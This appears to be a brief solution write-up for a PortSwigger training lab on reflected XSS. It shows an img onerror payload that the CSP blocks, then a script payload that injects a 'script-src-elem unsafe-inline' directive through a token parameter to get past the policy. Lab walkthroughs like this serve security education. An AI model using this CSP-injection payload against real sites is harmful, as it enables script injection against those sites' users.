
----

### Lab Description

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and calls the `alert` function.

Please note that the intended solution to this lab is only possible in Chrome

### Lab solution

- Insert the payload `<img src=1 onerror=alert(1)/>`

![](/static/img/Pasted_image_20230703092346.png)

- Verify that the `CSP` blocking the execution of the script
- Insert the following payload `<script>alert%281%29<%2Fscript>&token=;script-src-elem%20%27unsafe-inline%27`
![](/static/img/Pasted_image_20230703092813.png)